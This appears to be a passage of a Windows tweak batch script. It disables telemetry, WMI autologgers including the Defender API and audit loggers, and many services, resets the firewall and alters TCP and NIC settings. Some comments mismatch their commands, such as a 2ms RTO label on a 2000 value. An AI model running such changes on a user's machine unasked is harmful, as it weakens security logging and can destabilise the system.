reg add "HKLM\SOFTWARE\Policies\Microsoft\DeviceHealthAttestationService" /v "DisableSendGenericDriverNotFoundToWER" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Settings" /v "DisableSendGenericDriverNotFoundToWER" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\DriverDatabase\Policies\Settings" /v "DisableSendGenericDriverNotFoundToWER" /t REG_DWORD /d "1" /f >> APB_Log.txt
cls
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "PublishUserActivities" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableActivityFeed" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "UploadUserActivities" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\SQMClient\Reliability" /v "CEIPEnable" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\SQMClient\Reliability" /v "SqmLoggerRunning" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\SQMClient\Windows" /v "DisableOptinExperience" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\SQMClient\Windows" /v "SqmLoggerRunning" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\SQMClient\IE" /v "SqmLoggerRunning" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\HandwritingErrorReports" /v "PreventHandwritingErrorReports" /t REG_DWORD /d "1" /f >> APB_Log.txt
cls
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\FileHistory" /v "Disabled" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKCU\SOFTWARE\Microsoft\MediaPlayer\Preferences" /v "UsageTracking" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "NoUseStoreOpenWith" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableSoftLanding" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Peernet" /v "Disabled" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v DODownloadMode /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\WiFi\AllowWiFiHotSpotReporting" /v value /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKCU\SOFTWARE\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisabledByGroupPolicy" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontOfferThroughWUAU" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Biometrics" /v "Enabled" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\DriverDatabase\Policies\Settings" /v "DisableSendGenericDriverNotFoundToWER" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable AutoLoggers
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AppModel" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Cellcore" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Circular Kernel Context Logger" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\CloudExperienceHostOobe" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DataMarket" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DiagLog" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\HolographicDevice" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\iclsClient" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\iclsProxy" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Mellanox-Kernel" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-AssignedAccess-Trace" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Setup" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\NBSMBLOGGER" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\PEAuthLog" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\RdrLog" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\ReadyBoot" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatformTel" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SocketHeciServer" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SpoolerLogger" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SQMLogger" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TCPIPLOGGER" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TileStore" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Tpm" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TPMProvisioningService" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\UBPM" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WdiContextLog" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WFP-IPsec Trace" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiDriverIHVSession" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiDriverIHVSessionRepro" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiSession" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WinPhoneCritical" /v "Start" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogEnable" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogLevel" /t REG_DWORD /d "0" /f >> APB_Log.txt 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableThirdPartySuggestions" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Credssp" /v "DebugLogLevel" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Telemetry Services
echo Completed
sc stop DiagTrack >> APB_Log.txt
sc config DiagTrack start= disabled >> APB_Log.txt
sc stop dmwappushservice >> APB_Log.txt
sc config dmwappushservice start= disabled >> APB_Log.txt
sc stop diagnosticshub.standardcollector.service >> APB_Log.txt
sc config diagnosticshub.standardcollector.service start= disabled >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Reset Internet
echo Completed
ipconfig /release
ipconfig /renew
ipconfig /flushdns
netsh int ip reset
netsh int ipv4 reset
netsh int ipv6 reset
netsh int tcp reset
netsh winsock reset
netsh advfirewall reset
netsh branchcache reset
netsh http flush logbuffer
timeout /t 3 /nobreak > NUL
cls
:: Disable Network Throttling
echo Completed
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Set Network Autotuning to Normal
echo Completed
netsh int tcp set global autotuninglevel=normal
timeout /t 1 /nobreak > NUL
cls
:: Disable ECN
echo Completed
netsh int tcp set global ecncapability=disabled
timeout /t 1 /nobreak > NUL
cls
:: Enable DCA
echo Completed
netsh int tcp set global dca=enabled
timeout /t 1 /nobreak > NUL
cls
:: Enable NetDMA
echo Completed
netsh int tcp set global netdma=enabled
timeout /t 1 /nobreak > NUL
cls
:: Disable RSC
echo Completed
netsh int tcp set global rsc=disabled
timeout /t 1 /nobreak > NUL
cls
:: Enable RSS
echo Completed
netsh int tcp set global rss=enabled
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Ndis\Parameters" /v "RssBaseCpu" /t REG_DWORD /d "1" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable TCP Timestamps
echo Completed
netsh int tcp set global timestamps=disabled
timeout /t 1 /nobreak > NUL
cls
:: Set Initial RTO to 2ms
echo Completed
netsh int tcp set global initialRto=2000
timeout /t 1 /nobreak > NUL
cls
:: Set MTU Size to 1500
echo Completed
netsh interface ipv4 set subinterface “Ethernet” mtu=1500 store=persistent
timeout /t 1 /nobreak > NUL
cls
:: Disable NonSackRTTresiliency
echo Completed
netsh int tcp set global nonsackrttresiliency=disabled
timeout /t 1 /nobreak > NUL
cls
:: Set Max Syn Retransmissions to 2
echo Completed
netsh int tcp set global maxsynretransmissions=2
timeout /t 1 /nobreak > NUL
cls
:: Disable MPP
echo Completed
netsh int tcp set security mpp=disabled
timeout /t 1 /nobreak > NUL
cls
:: Disable Security Profiles
echo Completed
netsh int tcp set security profiles=disabled
timeout /t 1 /nobreak > NUL
cls
:: Disable Heuristics
echo Completed
netsh int tcp set heuristics disabled
timeout /t 1 /nobreak > NUL

:: Increase ARP Cache Size to 4096
echo Completed
netsh int ip set global neighborcachelimit=4096
timeout /t 1 /nobreak > NUL
cls
:: Enable CTCP
echo Completed
netsh int tcp set supplemental Internet congestionprovider=ctcp
timeout /t 1 /nobreak > NUL
cls
:: Disable Task Offloading
echo Completed
netsh int ip set global taskoffload=disabled
timeout /t 1 /nobreak > NUL
cls
:: Disable IPv6
echo Completed
netsh int ipv6 set state disabled
timeout /t 1 /nobreak > NUL
cls
:: Disable ISATAP
echo Completed
netsh int isatap set state disabled
timeout /t 1 /nobreak > NUL
cls
:: Disable Teredo
echo Completed
netsh int teredo set state disabled
timeout /t 1 /nobreak > NUL
cls
:: Set TTL to 64
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Enable TCP Window Scaling
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Set TcpMaxDupAcks
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable SackOpts
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Increase Maximum Port Number
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Decrease Time to Wait in "TIME_WAIT" State
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Set Network Priorities
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Adjust Sock Address Size
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "MinSockAddrLength" /t REG_DWORD /d "16" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "MaxSockAddrLength" /t REG_DWORD /d "16" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Nagle's Algorithm
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TCPNoDelay" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Delivery Optimization
echo Completed
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DODownloadMode" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DownloadMode" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Settings" /v "DownloadMode" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Auto Disconnect for Idle Connections
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "autodisconnect" /t REG_DWORD /d "4294967295" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Limit Number of SMB Sessions
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Oplocks
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "EnableOplocks" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Set IRP Stack Size
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "20" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Sharing Violations
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "SharingViolationDelay" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "SharingViolationRetries" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Get the Sub ID of the Network Adapter
for /f %%n in ('Reg query "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002bE10318}" /v "*SpeedDuplex" /s ^| findstr  "HKEY"') do (
cls
:: Disable NIC Power Savings
echo Completed
reg add "%%n" /v "AutoPowerSaveModeEnabled" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "AutoDisableGigabit" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "AdvancedEEE" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "DisableDelayedPowerUp" /t REG_SZ /d "2" /f >> APB_Log.txt
reg add "%%n" /v "*EEE" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "EEE" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "EnablePME" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "EEELinkAdvertisement" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "EnableGreenEthernet" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "EnableSavePowerNow" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "EnablePowerManagement" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "EnableDynamicPowerGating" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "EnableConnectedPowerGating" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "EnableWakeOnLan" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "GigaLite" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "NicAutoPowerSaver" /t REG_SZ /d "2" /f >> APB_Log.txt
reg add "%%n" /v "PowerDownPll" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "PowerSavingMode" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "ReduceSpeedOnPowerDown" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "S5NicKeepOverrideMacAddrV2" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "S5WakeOnLan" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "ULPMode" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "WakeOnDisconnect" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "*WakeOnMagicPacket" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "*WakeOnPattern" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "WakeOnLink" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "WolShutdownLinkSpeed" /t REG_SZ /d "2" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Jumbo Frame
echo Completed
reg add "%%n" /v "JumboPacket" /t REG_SZ /d "1514" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Configure Receive/Transmit Buffers
echo Completed
reg add "%%n" /v "TransmitBuffers" /t REG_SZ /d "4096" /f >> APB_Log.txt
reg add "%%n" /v "ReceiveBuffers" /t REG_SZ /d "512" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Configure Offloads
echo Completed
reg add "%%n" /v "IPChecksumOffloadIPv4" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "LsoV1IPv4" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "LsoV2IPv4" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "LsoV2IPv6" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "PMARPOffload" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "PMNSOffload" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "TCPChecksumOffloadIPv4" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "TCPChecksumOffloadIPv6" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "UDPChecksumOffloadIPv6" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "UDPChecksumOffloadIPv4" /t REG_SZ /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Enable RSS in NIC
echo Completed
reg add "%%n" /v "RSS" /t REG_SZ /d "1" /f >> APB_Log.txt
reg add "%%n" /v "*NumRssQueues" /t REG_SZ /d "2" /f >> APB_Log.txt
reg add "%%n" /v "RSSProfile" /t REG_SZ /d "3" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Flow Control
echo Completed
reg add "%%n" /v "*FlowControl" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "FlowControlCap" /t REG_SZ /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Remove Interrupt Delays
echo Completed
reg add "%%n" /v "RxAbsIntDelay" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "TxIntDelay" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "%%n" /v "TxAbsIntDelay" /t REG_SZ /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Remove Adapter Notification
echo Completed
reg add "%%n" /v "FatChannelIntolerant" /t REG_SZ /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Enable Interrupt Moderation
echo Completed
reg add "%%n" /v "*InterruptModeration" /t REG_SZ /d "1" /f >> APB_Log.txt
)
echo at this stage restore point may not work but it might if you dont ddu

cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TapiSrv" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FontCache3.0.0.0" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WpcMonSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SEMgrSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PNRPsvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WEPHOSTSVC" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\p2psvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\p2pimsvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PhoneSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v "Start" /t REG_DWORD /d "3" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Wecsvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SensorDataService" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SensrSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\perceptionsimulation" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\StiSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WMPNetworkSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\autotimesvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\autotimesvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\autotimesvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\edgeupdatem" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MicrosoftEdgeElevationService" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ALG" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\QWAVE" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\IpxlatCfgSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\icssvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DusmSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MapsBroker" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\edgeupdate" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SensorService" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\shpamsvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\svsvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SysMain" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MSiSCSI" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
cls
